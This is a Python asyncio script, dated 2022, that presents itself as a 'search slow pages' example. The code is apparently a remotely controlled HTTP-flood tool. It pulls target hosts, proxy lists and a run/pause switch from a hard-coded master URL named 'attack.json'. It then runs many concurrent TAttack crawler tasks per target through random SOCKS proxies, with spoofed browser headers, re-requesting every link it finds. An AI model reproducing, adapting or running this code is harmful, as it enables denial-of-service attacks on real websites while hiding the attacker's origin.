#!/usr/bin/python3 -B

'''
Python async
Search slow pages example
VladVons@gmail.com
2022.03.05
'''


_MaxTasks = 5
#_MasterUrl = 'http://176.57.68.80/www/temp/attack-avto.json'
_MasterUrl = 'http://176.57.68.80/www/temp/attack.json'
#
_ExtIPUrl = 'http://icanhazip.com'
__version__ = 'VladVons@gmail.com, v1.02, 2022.03.08'


import time
import random
import asyncio
import aiohttp
import json
import os
from datetime import datetime
from urllib.parse import urlparse
from aiohttp_socks import ProxyConnector
from bs4 import BeautifulSoup


def Log(aFile:str, aData: str):
    Time = datetime.now().strftime("%H:%M:%S")
    Data = Time + ' ' + aData
    print(Data)
    with open(aFile, 'a+') as hFile:
        hFile.write(Data + '\n')


class TDownload():
    def __init__(self, aProxies: list = []):
        self.Proxies = aProxies

    async def Get(self, aUrl: str) -> tuple:
        async with aiohttp.ClientSession(connector=self._GetConnector()) as Session:
            TimeStart = time.time()
            async with Session.get(aUrl, headers=self._GetHeaders()) as Response:
                Data = await Response.read()
                return (Data, Response.status, round(time.time() - TimeStart, 4))

    def _GetConnector(self) -> ProxyConnector:
        if (self.Proxies):
            return ProxyConnector.from_url(random.choice(self.Proxies))

    @staticmethod
    def _GetHeaders() -> dict:
        OSs = ['Macintosh; Intel Mac OS X 10_15_5', 'Windows NT 10.0; Win64; x64; rv:77', 'Linux; Intel Ubuntu 20.04']
        Browsers = ['Chrome/83', 'Firefox/77', 'Opera/45']

        return {
            'Accept': '*/*',
            'User-Agent': 'Mozilla/5.0 (%s) %s' % (random.choice(OSs), random.choice(Browsers))
        }


class TAttack():
    def __init__(self, aParent, aUrlRoot: str):
        self.Parent = aParent
        self.UrlRoot = aUrlRoot

        self.Sleep = 1
        self.Timeout = 30
        self.LogFile = 'inf_' + urlparse(self.UrlRoot).hostname + '.log'

        self.Urls = []
        self.TotalData = 0
        self.UrlDone = 0
        self.IsRun = False

        self.Queue = asyncio.Queue()
        self.Queue.put_nowait(aUrlRoot)

        self.Event = asyncio.Event()
        self.Wait(False)

    def _Log(self, aData: str):
        Log(self.LogFile, aData)

    @staticmethod
    def IsMimeApp(aUrl: str) -> bool: 
        Path = urlparse(aUrl).path
        Ext = os.path.splitext(Path)[1]
        return Ext in ['.zip', '.rar', '.xml', '.pdf', '.jpg', '.jpeg', '.png', '.gif']

    async def _GrabHref(self, aUrl: str, aData: str, aStatus: int, aTaskId: int, aDuration: float):
        UrlSize = len(aData)
        self.TotalData += UrlSize
        self.UrlDone += 1

        Soup = BeautifulSoup(aData, "lxml")
        for A in Soup.find_all("a"):
            Href = A.get("href", '').strip().rstrip('/')
            if (Href):
                if (Href.startswith('/')):
                    Href = self.UrlRoot + Href

                if (Href.startswith(self.UrlRoot)) and \
                    (not Href.startswith('#')) and \
                    (not self.IsMimeApp(Href)) and \
                    (not Href in self.Urls):
                    self.Urls.append(Href)
                    self.Queue.put_nowait(Href)
        Msg = 'task:%3d, status:%d, found:%4d, done:%4d, total:%5dM, size:%4dK, time:%7.3f, %s' % \
              (aTaskId, aStatus, len(self.Urls), self.UrlDone, self.TotalData/1000000, UrlSize/1000, aDuration, aUrl)
        self._Log(Msg)

    async def _Worker(self, aTaskId: int):
        #await asyncio.sleep(aTaskId)
        TimeStart = time.time()
        Download = TDownload(self.Parent.Loader.Data['proxies'])

        self.IsRun = True
        while (self.IsRun):
            await self.Event.wait()
            await asyncio.sleep(self.Sleep)

            if (self.Queue.empty()) and (time.time() - TimeStart > self.Timeout):
                break

            try:
                Url = await asyncio.wait_for(self.Queue.get(), timeout = self.Timeout)
                Arr = await Download.Get(Url)
                if (Arr):            
                    Data, Status, Time = Arr
                    await self._GrabHref(Url, Data, Status, aTaskId, Time)
            except (aiohttp.ClientConnectorError, aiohttp.ClientError) as E:
                self._Log('Err:%s, %s' % (Url, E))
            except asyncio.TimeoutError:
                self._Log('Err:%s, queue timeout %d' % (self.UrlRoot, self.Timeout))
            except Exception as E:
                self._Log('Err:%s, %s'% (Url, E))

        self._Log('Done %s, task %d' % (self.UrlRoot, aTaskId))

    def Wait(self, aEnable: bool):
        if (aEnable):
            self.Event.clear()
        else:
            self.Event.set()

    async def Run(self, aMaxTasks: int):
        Tasks = [asyncio.create_task(self._Worker(i)) for i in range(aMaxTasks)]
        await asyncio.gather(*Tasks)
        self.IsRun = False
        print('Done %s' % (self.UrlRoot))


class TLoader():
    def __init__(self):
        self.Data = {}
        self.Download = TDownload()

    async def FromUrl(self, aUrl: str) -> dict:
        Arr = await self.Download.Get(aUrl)
        if (Arr):
            return self._Check(Arr[0].decode())

    def FromFile(self, aFile: str) -> dict:
       with open(aFile, 'r') as hFile:
            return self._Check(hFile.read())

    def _Check(self, aData: str) -> bool:
        if (aData):
            Data = json.loads(aData)
            if (self.Data != Data):
                self.Data = Data
                self.Download.Proxies = Data.get('proxies', [])
                return True

    async def ShowExtIP(self):
        Arr = await self.Download.Get(_ExtIPUrl)
        print('Loader check', Arr)


class TMain():
    def __init__(self):
        self.Tasks = []
        self.Task_Create = None
        self.Loader = TLoader()

    async def Create(self, aUrls: list):
        for Url in aUrls:
            Attack = TAttack(self, Url)
            Task = asyncio.create_task(Attack.Run(_MaxTasks))
            self.Tasks.append([Attack, Task])

    def Cancel(self):
        for Attack, Task in self.Tasks:
            Task.cancel()
            del Attack
        self.Tasks = []

    def Wait(self, aEnable: bool):
        for Attack, Task in self.Tasks:
            Attack.Wait(aEnable)

    async def Run(self):
        while (True):
            await self.Loader.ShowExtIP()

            if (await self.Loader.FromUrl(_MasterUrl)):
                print('Loader create')
                self.Wait(not self.Loader.Data['run'])

                self.Cancel()
                await asyncio.sleep(1)

                if (self.Task_Create):
                    self.Task_Create.cancel()
                self.Task_Create = asyncio.create_task(self.Create(self.Loader.Data['hosts']))

            await asyncio.sleep(10)


print(__version__)
asyncio.run(TMain().Run())
